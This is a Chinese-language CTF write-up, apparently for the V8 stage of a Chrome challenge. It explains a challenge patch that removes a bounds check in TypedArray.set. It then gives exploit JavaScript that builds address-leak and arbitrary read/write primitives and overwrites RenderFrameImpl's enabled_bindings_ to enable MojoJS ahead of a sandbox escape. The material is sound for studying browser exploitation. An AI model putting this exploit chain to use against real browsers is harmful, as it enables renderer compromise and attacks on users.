**# 基本介绍**

  

Chrome 的安全架构以进程为单位进行分隔，其中比较重要的一个环节是沙盒机制，借助沙盒，可以将大部分攻击面限制在沙盒进程中，从而减少攻击面带来的危害。因此，Chrome 中大部分进程都位于沙盒中（例如 Renderer 进程）。此外，Chrome 还有一个 Browser 进程，该进程不受沙盒控制，具有完整的权限。沙盒进程在需要执行沙盒外的操作时（例如写入文件），则通过 IPC 与 Browser 进程通信，由 Browser 进程完成。  
  
目前 Chrome 中使用的 IPC 机制称为 Mojo，因此理论上我们可以借助 MojoJS 在 Renderer 进程中使用 JavaScript 与 Browser 进程通信，而如果我们发现了 Chrome 所提供的 Mojo 接口中存在的漏洞，则可以通过 MojoJS 在 Browser 进程上对漏洞进行利用，严重的可以在沙盒外实现任意代码执行，造成比较严重的危害。但是默认情况下，Chrome 中是关闭了 MojoJS 这一特性的，因此无法直接使用，需要借助 Renderer 进程中的漏洞将这一特性打开。所以，第一部分 V8 篇漏洞利用的主要目的就是打开 MojoJS 特性，使其可以直接使用 JavaScript 跟 Browser 进程通信。  

  

**\# 漏洞**

  

V8 部分的漏洞比较简单。题目给了一个 v8\_bug.patch 文件，通过查看该文件，可以发现漏洞位于 TypedArray 类的 set( typedArray \[ , offset \] ) 内置方法中：  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
...-  const targetLength = target.length;+  // const targetLength = target.length;...   // 21. If srcLength + targetOffset > targetLength, throw a RangeError   //   exception.-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)-      otherwise IfOffsetOutOfBounds;+  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)+  //     otherwise IfOffsetOutOfBounds;...
```

该方法原始版本会对传入的 typedArray 的长度做一个判断，但是 Patch 直接将这个判断注释掉了，因此这里存在一个很明显的溢出写的漏洞，可以通过溢出写覆盖 JavaScript 中数组长度，从而完成任意地址读写原语。  

  

**\# 利用 - 任意地址读写**

  

为了方便调试，找到了题目版本的 Chrome 对应的 V8 的 Commit ID（0cf641358acebb26c2b7ddc047b1b41597d344c8），打上相应的 Patch 编译好后开始写 Exp。  

首先，我们查看 TypedArray 的内存布局：

![](../Images/7afa38630f0316a6262010c53b95c650.png)

可以发现 TypedArray 的元数据内存位置位于 elements 内存的后面，因此可以使用越界写覆盖 TypedArray 的长度字段，使其可以更灵活的访问后序的数据。这里为了后序利用方便，在 TypedArray 后面构造了一个浮点数数组（感觉直接使用 TypedArray 也可以），然后借助 TypedArray 的越界写改写浮点数数组的长度字段，之后通过浮点数数组来获得任意偏移读写的能力：  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
var typedArray1 = new Int32Array(8);var oob_array = [1.1, 2.2, 3.3, 4.4];var typedArray2 = new Int32Array(4);typedArray2[0] = 0x100;typedArray2[2] = 0x40;/* Trigger vuln */typedArray1.set(typedArray2, 14);for (var i = 0; i < 0x40; ++i) {    /* Change the length of oob_array */    if (typedArray1[i] == 0x8) {        typedArray1[i] = 0x1000;    }}
```

然后通过构造一个对象，借助 oob\_array 可以越界读取地址，获得任意对象地址泄漏的原语。但是需要注意的是 V8 使用了指针压缩的技术\[1\]，因此只能泄漏出低 4 字节的相对地址。  
此外，我们还需要一个相对地址读取和一个绝对地址读写的原语，通过观察 Array 在内存中的布局可以发现，Array 的 elements 也是使用相对地址进行存储，因此可以创建一个 Array 对象，通过 oob\_array 改写 elements 的值实现相对地址读取。而通过观察 ArrayBuffer 的内存布局可以发现，其 back pointer 指针直接使用绝对地址来存储，因此通过创建 ArrayBuffer 来实现绝对地址读写，如下所示：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
var test = {};var victim_obj = {obj: test};  /* 相对地址泄漏原语 */var victim_array = [1.1];  /* 相对地址读取原语 */var control_buffer = new ArrayBuffer(0x1000);  /* 相对地址读写原语 */
```

**\# 利用 - 开启 MojoJS**

  
有了这些原语之后，如果是单纯的在 V8 上的利用，则直接找到 rwx 内存区域写入 Shellcode 进行执行即可。但是之前提到，现在 V8 利用的目标是开启 MojoJS。当前 JavaScript 上下文是否开启 MojoJS 是在 RenderFrameImpl::DidCreateScriptContext 中判断的：  

*   
*   
*   
*   
*   
*   
*   
*   

```
void RenderFrameImpl::DidCreateScriptContext(v8::Local<v8::Context> context, int world_id) {// ...    if (((enabled_bindings_ & BINDINGS_POLICY_MOJO_WEB_UI) ||enable_mojo_js_bindings_) &&        IsMainFrame() && world_id == ISOLATED_WORLD_ID_GLOBAL) {        blink::WebV8Features::EnableMojoJS(context, true);    }// ...}
```

从上面代码可以看到，可以通过将当前主 Frame 对应的 RenderFrameImpl 中的 enabled\_bindings\_ 改为 BINDINGS\_POLICY\_MOJO\_WEB\_UI 来实现。那么如何找到这个 Frame 对应的 enabled\_bindings\_ 地址呢？在 Chrome 中，有一个全局变量 g\_frame\_map，该变量定义如下：

*   
*   

```
typedef std::map<blink::WebFrame*, RenderFrameImpl*> FrameMap;base::LazyInstance<FrameMap>::DestructorAtExit g_frame_map = LAZY_INSTANCE_INITIALIZER;
```

因此该变量中存放着 Frame 与 RenderFrameImpl 的对应关系，可以通过 Chrome 的基地址定位到 g\_frame\_map 变量的地址后，找到对应的 Frame 完成修改。对于 Chrome 基地址，在 Chrome 的 JavaScript 上下文中，有一个 window 对象，该对象中存放有 Chrome 中的一些函数，因此可以通过读取该地址来泄漏 Chrome 基地址。泄漏基地址之后，通过偏移获得 enabled\_bindings\_ 的地址，然后将该地址的值改写成 BINDINGS\_POLICY\_MOJO\_WEB\_UI，之后刷新当前 Frame，即可开启 MojoJS：  

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
var window_addr = relative_addr_of(window);var chrome_base = read_relative_address(window_addr + 0x10) - 0xc1ce730n;var g_frame_map = chrome_base + 0xc5637e0n;
var begin_ptr = read_abs_address_64(g_frame_map + 0x8n);/* 有时候还得判断这个 frame_ptr 是不是为 Main Frame */var render_frame_ptr = read_abs_address_64(begin_ptr + 0x28n);var enable_bindings_address = render_frame_ptr + 0x444n;change_control_buffer(enable_bindings_address);var data_view = new Uint8Array(control_buffer);if (data_view[0x0] == 0x0) {    data_view[0x0] = 0x2;    window.location.reload();}
```
